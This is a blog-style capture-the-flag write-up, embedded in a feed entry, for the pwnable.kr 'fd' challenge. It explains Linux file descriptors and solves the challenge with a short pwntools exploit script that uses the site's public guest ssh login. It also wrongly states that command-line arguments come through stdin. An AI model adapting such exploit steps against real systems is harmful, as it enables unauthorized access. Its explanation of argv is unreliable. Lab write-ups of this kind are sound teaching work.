/></entry><entry><title type="html">pwnable.kr - fd , Understanding Linux File Descriptors and creating a simple exploit with python pwntools</title><link href="http://localhost:4000/pwn/fd/" rel="alternate" type="text/html" title="pwnable.kr - fd , Understanding Linux File Descriptors and creating a simple exploit with python pwntools" /><published>2019-02-19T00:00:00+02:00</published><updated>2019-02-19T00:00:00+02:00</updated><id>http://localhost:4000/pwn/fd</id><content type="html" xml:base="http://localhost:4000/pwn/fd/">&lt;hr /&gt;

&lt;h3 id=&quot;introduction&quot;&gt;Introduction&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys--lately-i-have-been-doing-pwn-challenges-and-i-decided-to-share-some-stuff-with-you-from-time-to-time-like-i-do-with-the-other-write-ups-today-we-will-solve-fd-from-pwnablekr--its-a-very-easy-one-but-as-always-we-will-go-in-detail&quot;&gt;Hey guys , Lately I have been doing pwn challenges and I decided to share some stuff with you from time to time like I do with the other write-ups. Today we will solve fd from pwnable.kr , it’s a very easy one but as always we will go in detail.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;pwn means to compromise or control, specifically another computer (server or PC), website, gateway device, or application. It is synonymous with one of the definitions of hacking or cracking.
-&lt;a href=&quot;https://en.wikipedia.org/wiki/Pwn&quot;&gt;Wikipedia&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;
&lt;img src=&quot;/images/pwn/fd/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;challenge-description&quot;&gt;Challenge Description&lt;/h3&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Mommy! what is a file descriptor in Linux?
ssh fd@pwnable.kr -p2222 (pw:guest)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;we-have-ssh-login-info-and-some-sort-of-a-hint--before-doing-anything-lets-talk-about-file-descriptors--because-thats-what-the-hint-said&quot;&gt;We have ssh login info, and some sort of a hint , before doing anything let’s talk about file descriptors , because that’s what the hint said.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;file-descriptors&quot;&gt;File descriptors&lt;/h3&gt;
&lt;h4 id=&quot;file-descriptors-simply-are-indicators-or-handles-used-to-access-a-file-or-io-inputoutput-resource--file-descriptors-are-represented-in-c-as-integers-and-there-are-3-types-of-file-descriptors-&quot;&gt;File descriptors simply are indicators or handles used to access a file or i/o (input/output) resource , File descriptors are represented in &lt;code class=&quot;highlighter-rouge&quot;&gt;c&lt;/code&gt; as integers and there are 3 types of file descriptors :&lt;/h4&gt;
&lt;h4 id=&quot;standard-input-stdin--its-integer-value-is-0&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;standard input&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;stdin&lt;/code&gt;) , its integer value is &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;standard-output-stdout--its-integer-value-is-1&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;standard output&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;stdout&lt;/code&gt;) , its integer value is &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;standard-error-stderr--its-integer-value-is-2&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;standard error&lt;/code&gt; (&lt;code class=&quot;highlighter-rouge&quot;&gt;stderr&lt;/code&gt;) , its integer value is &lt;code class=&quot;highlighter-rouge&quot;&gt;2&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;to-summarize-this-up--when-you-run-a-program-and-give-it-arguments-through-sysargv-for-example--thats-stdin--whatever-the-program-gives-you-back-as-an-output--thats-stdout--if-the-program-gave-you-an-error--because-you-missed-a-required-argument-or-gave-it-a-wrong-argument-for-example--thats-stderr&quot;&gt;To summarize this up , when you run a program and give it arguments through &lt;code class=&quot;highlighter-rouge&quot;&gt;sys.argv&lt;/code&gt; for example , that’s &lt;code class=&quot;highlighter-rouge&quot;&gt;stdin&lt;/code&gt; , whatever the program gives you back as an output , that’s &lt;code class=&quot;highlighter-rouge&quot;&gt;stdout&lt;/code&gt; . If the program gave you an error , because you missed a required argument or gave it a wrong argument for example , that’s &lt;code class=&quot;highlighter-rouge&quot;&gt;stderr&lt;/code&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;source-analysis&quot;&gt;Source analysis&lt;/h3&gt;
&lt;h4 id=&quot;after-we-ssh-to-the-server-ssh-fdpwnablekr--p2222--password--guest-we-find-3-files&quot;&gt;After we &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; to the server (&lt;code class=&quot;highlighter-rouge&quot;&gt;ssh fd@pwnable.kr -p2222&lt;/code&gt; , password : &lt;code class=&quot;highlighter-rouge&quot;&gt;guest&lt;/code&gt;) we find 3 files&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/pwn/fd/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;fd--fdc-and-flag&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;fd&lt;/code&gt; , &lt;code class=&quot;highlighter-rouge&quot;&gt;fd.c&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;flag&lt;/code&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;fd-is-an-executable--and-fdc-is-the-source-of-that-executable&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;fd&lt;/code&gt; is an executable , and &lt;code class=&quot;highlighter-rouge&quot;&gt;fd.c&lt;/code&gt; is the source of that executable&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/pwn/fd/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-dont-have-permissions-to-view-flag-&quot;&gt;And we don’t have permissions to view &lt;code class=&quot;highlighter-rouge&quot;&gt;flag&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/pwn/fd/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;lets-take-a-look-at-the-source-&quot;&gt;Let’s take a look at the source :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
char buf[32];
int main(int argc, char* argv[], char* envp[]){
        if(argc&amp;lt;2){
                printf(&quot;pass argv[1] a number\n&quot;);
                return 0;
        }
        int fd = atoi( argv[1] ) - 0x1234;
        int len = 0;
        len = read(fd, buf, 32);
        if(!strcmp(&quot;LETMEWIN\n&quot;, buf)){
                printf(&quot;good job :)\n&quot;);
                system(&quot;/bin/cat flag&quot;);
                exit(0);
        }
        printf(&quot;learn about Linux file IO\n&quot;);
        return 0;

}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h3 id=&quot;breakdown-&quot;&gt;Breakdown :&lt;/h3&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;char buf[32];
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;this-assigns-a-buffer-of-32-chars-to-the-variable-buf&quot;&gt;This assigns a buffer of 32 chars to the variable &lt;code class=&quot;highlighter-rouge&quot;&gt;buf&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if(argc&amp;lt;2){
                printf(&quot;pass argv[1] a number\n&quot;);
                return 0;
        }

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;here-it-starts-by-checking-if-we-passed-and-argument-or-not--and-if-we-didnt--it-will-print-pass-argv1-a-number&quot;&gt;Here it starts by checking if we passed and argument or not , and if we didn’t , it will print &lt;code class=&quot;highlighter-rouge&quot;&gt;pass argv[1] a number&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/pwn/fd/4.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;int fd = atoi( argv[1] ) - 0x1234;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;then-it-defines-a-variable-called-fd--the-value-of-that-variable-is-atoi-argv1----0x1234-atoi-is-a-function-in-c-that-converts-a-string-into-an-integer--it-stands-for-ascii-to-integer--0x1234-is-the-hex-of-4660&quot;&gt;Then it defines a variable called &lt;code class=&quot;highlighter-rouge&quot;&gt;fd&lt;/code&gt; , the value of that variable is &lt;code class=&quot;highlighter-rouge&quot;&gt;atoi( argv[1] ) - 0x1234&lt;/code&gt;. &lt;code class=&quot;highlighter-rouge&quot;&gt;atoi()&lt;/code&gt; is a function in &lt;code class=&quot;highlighter-rouge&quot;&gt;c&lt;/code&gt; that converts a string into an integer , it stands for &lt;code class=&quot;highlighter-rouge&quot;&gt;Ascii to Integer&lt;/code&gt; , &lt;code class=&quot;highlighter-rouge&quot;&gt;0x1234&lt;/code&gt; is the hex of &lt;code class=&quot;highlighter-rouge&quot;&gt;4660&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/pwn/fd/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-it-subtracts-4660-from-our-input&quot;&gt;So it subtracts 4660 from our input.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;int len = 0;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;this-defines-a-variable-called-len-and-assigns-a-value-of-0-to-it&quot;&gt;This defines a variable called &lt;code class=&quot;highlighter-rouge&quot;&gt;len&lt;/code&gt; and assigns a value of &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; to it&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;        len = read(fd, buf, 32);
        if(!strcmp(&quot;LETMEWIN\n&quot;, buf)){
                printf(&quot;good job :)\n&quot;);
                system(&quot;/bin/cat flag&quot;);
                exit(0);
        }
        printf(&quot;learn about Linux file IO\n&quot;);
        return 0;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;here-its-taking-fd-and-also-reading-our-input-and-puts-it-into-buf--then-theres-an-if-statement-which-checks-if-the-value-of-buf-is-letmein--if-its-then-it-will-print-good-job-and-give-us-the-flag--but-if-its-not-it-will-print-learn-about-linux-file-io&quot;&gt;Here it’s taking &lt;code class=&quot;highlighter-rouge&quot;&gt;fd&lt;/code&gt; and also reading our input and puts it into &lt;code class=&quot;highlighter-rouge&quot;&gt;buf&lt;/code&gt; , then there’s an if statement which checks if the value of buf is &lt;code class=&quot;highlighter-rouge&quot;&gt;LETMEIN&lt;/code&gt; , if it’s then it will print &lt;code class=&quot;highlighter-rouge&quot;&gt;good job&lt;/code&gt; and give us the flag , but if it’s not it will print &lt;code class=&quot;highlighter-rouge&quot;&gt;learn about Linux file IO&lt;/code&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h3&gt;
&lt;h4 id=&quot;now-we-have-an-idea-about-the-logic-of-the-program--and-a-pwn-challenge-is-all-about-breaking-that-logic&quot;&gt;Now we have an idea about the logic of the program , and a pwn challenge is all about breaking that logic.&lt;/h4&gt;
&lt;h4 id=&quot;lets-run-the-program-just-to-test-&quot;&gt;Let’s run the program just to test :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;./fd 1337&lt;/code&gt;
&lt;img src=&quot;/images/pwn/fd/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-prints-learn-about-linux-file-io--because-we-didnt-get-fd-right-we-know-that-fd-is-an-abbreviation-for-file-descriptor--and-there-are-3-file-descriptors-stdin-stdout-stderr--and-we-can-also-control-the-value-of-fd-because-we-know-that-its-subtracting-4660-from-argv1-and-we-control-argv1--how-are-we-giving-the-program-argv1--through-stdin-which-is-represented-by-0--so-if-we-gave-the-program-4660--fd--4660---4660--fd--0-lets-try-it&quot;&gt;It prints &lt;code class=&quot;highlighter-rouge&quot;&gt;learn about Linux file IO&lt;/code&gt; , because we didn’t get &lt;code class=&quot;highlighter-rouge&quot;&gt;fd&lt;/code&gt; right. We know that &lt;code class=&quot;highlighter-rouge&quot;&gt;fd&lt;/code&gt; is an abbreviation for file descriptor , and there are 3 file descriptors &lt;code class=&quot;highlighter-rouge&quot;&gt;stdin&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;stdout&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;stderr&lt;/code&gt; , And we can also control the value of &lt;code class=&quot;highlighter-rouge&quot;&gt;fd&lt;/code&gt; because we know that it’s subtracting 4660 from &lt;code class=&quot;highlighter-rouge&quot;&gt;argv[1]&lt;/code&gt; and we control &lt;code class=&quot;highlighter-rouge&quot;&gt;argv[1]&lt;/code&gt; , how are we giving the program &lt;code class=&quot;highlighter-rouge&quot;&gt;argv[1]&lt;/code&gt; ? Through &lt;code class=&quot;highlighter-rouge&quot;&gt;stdin&lt;/code&gt; which is represented by &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; , so if we gave the program &lt;code class=&quot;highlighter-rouge&quot;&gt;4660&lt;/code&gt; , &lt;code class=&quot;highlighter-rouge&quot;&gt;fd = 4660 - 4660&lt;/code&gt; , &lt;code class=&quot;highlighter-rouge&quot;&gt;fd = 0&lt;/code&gt;. Let’s try it.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/pwn/fd/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-it-didnt-print-learn-about-linux-file-io--instead-of-that-its-reading-our-input--len--readfd-buf-32&quot;&gt;Now it didn’t print &lt;code class=&quot;highlighter-rouge&quot;&gt;learn about Linux file IO&lt;/code&gt; , instead of that it’s reading our input –&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;len = read(fd, buf, 32);&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;we-knew-earlier-that-we-have-to-make-buf--letmewin-to-execute-the-first-if-condition-&quot;&gt;We knew earlier that we have to make buf = “LETMEWIN” to execute the first &lt;code class=&quot;highlighter-rouge&quot;&gt;if&lt;/code&gt; condition :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/pwn/fd/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-got-the-flag--mommy-i-think-i-know-what-a-file-descriptor-is&quot;&gt;And we got the flag : “mommy! I think I know what a file descriptor is!!”&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;exploitation-with-python-pwntools&quot;&gt;Exploitation with python pwntools&lt;/h3&gt;
&lt;h4 id=&quot;we-will-use-a-python-library-called-pwntools-to-create-an-exploit-read-the-documentation-here&quot;&gt;We will use a python library called pwntools to create an exploit. Read the documentation &lt;a href=&quot;http://docs.pwntools.com/en/stable/about.html&quot;&gt;here&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;we-will-import-the-pwntools-library-&quot;&gt;We will import the pwntools library :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;from pwn import *&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-we-will-set-up-an-ssh-connection-to-the-server-&quot;&gt;Then we will set up an &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; connection to the server :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;shell = ssh('fd' ,'pwnable.kr' ,password='guest', port=2222)&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;fd-is-the-username--pwnablekr-is-the-host&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;fd&lt;/code&gt; is the username , &lt;code class=&quot;highlighter-rouge&quot;&gt;pwnable.kr&lt;/code&gt; is the host&lt;/h4&gt;
&lt;h4 id=&quot;after-that-we-will-start-a-process-to-execute-fd-4660&quot;&gt;After that we will start a process to execute &lt;code class=&quot;highlighter-rouge&quot;&gt;./fd 4660&lt;/code&gt;&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;process = shell.process(executable='./fd', argv=['fd','4660'])&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-finally-we-will-send-letmewin-and-read-the-output&quot;&gt;And finally we will send &lt;code class=&quot;highlighter-rouge&quot;&gt;LETMEWIN&lt;/code&gt; and read the output&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;process.sendline('LETMEWIN')&lt;/code&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;print process.recv()&lt;/code&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h3 id=&quot;final-script-&quot;&gt;Final script :&lt;/h3&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python&lt;/span&gt;

&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ssh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'fd'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'pwnable.kr'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'guest'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2222&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;process&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;executable&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'./fd'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'fd'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'4660'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'LETMEWIN'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/pwn/fd/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;lets-try-it-&quot;&gt;Let’s try it :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;./exploit.py&lt;/code&gt;
&lt;img src=&quot;/images/pwn/fd/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-its-working-&quot;&gt;And it’s working !&lt;/h4&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-other-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;other write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;</content><author><name></name></author><summary type="html">Introduction Hey guys , Lately I have been doing pwn challenges and I decided to share some stuff with you from time to time like I do with the other write-ups. Today we will solve fd from pwnable.kr , it’s a very easy one but as always we will go in detail. pwn means to compromise or control, specifically another computer (server or PC), website, gateway device, or application. It is synonymous with one of the definitions of hacking or cracking. -Wikipedia Challenge Description Mommy! what is a file descriptor in Linux? ssh fd@pwnable.kr -p2222 (pw:guest) We have ssh login info, and some sort of a hint , before doing anything let’s talk about file descriptors , because that’s what the hint said. File descriptors File descriptors simply are indicators or handles used to access a file or i/o (input/output) resource , File descriptors are represented in c as integers and there are 3 types of file descriptors : standard input (stdin) , its integer value is 0 standard output (stdout) , its integer value is 1 standard error (stderr) , its integer value is 2 To summarize this up , when you run a program and give it arguments through sys.argv for example , that’s stdin , whatever the program gives you back as an output , that’s stdout . If the program gave you an error , because you missed a required argument or gave it a wrong argument for example , that’s stderr. Source analysis After we ssh to the server (ssh fd@pwnable.kr -p2222 , password : guest) we find 3 files fd , fd.c and flag. fd is an executable , and fd.c is the source of that executable And we don’t have permissions to view flag : Let’s take a look at the source : #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;string.h&amp;gt; char buf[32]; int main(int argc, char* argv[], char* envp[]){ if(argc&amp;lt;2){ printf(&quot;pass argv[1] a number\n&quot;); return 0; } int fd = atoi( argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp(&quot;LETMEWIN\n&quot;, buf)){ printf(&quot;good job :)\n&quot;); system(&quot;/bin/cat flag&quot;); exit(0); } printf(&quot;learn about Linux file IO\n&quot;); return 0; } Breakdown : char buf[32]; This assigns a buffer of 32 chars to the variable buf if(argc&amp;lt;2){ printf(&quot;pass argv[1] a number\n&quot;); return 0; } Here it starts by checking if we passed and argument or not , and if we didn’t , it will print pass argv[1] a number int fd = atoi( argv[1] ) - 0x1234; Then it defines a variable called fd , the value of that variable is atoi( argv[1] ) - 0x1234. atoi() is a function in c that converts a string into an integer , it stands for Ascii to Integer , 0x1234 is the hex of 4660 So it subtracts 4660 from our input. int len = 0; This defines a variable called len and assigns a value of 0 to it len = read(fd, buf, 32); if(!strcmp(&quot;LETMEWIN\n&quot;, buf)){ printf(&quot;good job :)\n&quot;); system(&quot;/bin/cat flag&quot;); exit(0); } printf(&quot;learn about Linux file IO\n&quot;); return 0; Here it’s taking fd and also reading our input and puts it into buf , then there’s an if statement which checks if the value of buf is LETMEIN , if it’s then it will print good job and give us the flag , but if it’s not it will print learn about Linux file IO. Exploitation Now we have an idea about the logic of the program , and a pwn challenge is all about breaking that logic. Let’s run the program just to test : ./fd 1337 It prints learn about Linux file IO , because we didn’t get fd right. We know that fd is an abbreviation for file descriptor , and there are 3 file descriptors stdin stdout stderr , And we can also control the value of fd because we know that it’s subtracting 4660 from argv[1] and we control argv[1] , how are we giving the program argv[1] ? Through stdin which is represented by 0 , so if we gave the program 4660 , fd = 4660 - 4660 , fd = 0. Let’s try it. Now it didn’t print learn about Linux file IO , instead of that it’s reading our input –&amp;gt; len = read(fd, buf, 32); We knew earlier that we have to make buf = “LETMEWIN” to execute the first if condition : And we got the flag : “mommy! I think I know what a file descriptor is!!” Exploitation with python pwntools We will use a python library called pwntools to create an exploit. Read the documentation here We will import the pwntools library : from pwn import * Then we will set up an ssh connection to the server : shell = ssh('fd' ,'pwnable.kr' ,password='guest', port=2222) fd is the username , pwnable.kr is the host After that we will start a process to execute ./fd 4660 process = shell.process(executable='./fd', argv=['fd','4660']) And finally we will send LETMEWIN and read the output process.sendline('LETMEWIN') print process.recv() Final script : #!/usr/bin/python from pwn import * shell = ssh('fd' ,'pwnable.kr' ,password='guest', port=2222) process = shell.process(executable='./fd', argv=['fd','4660']) process.sendline('LETMEWIN') print process.recv() Let’s try it : ./exploit.py And it’s working ! That’s it , Feedback is appreciated ! Don’t forget to read the other write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/pwn/fd/0.png" /></entry></feed>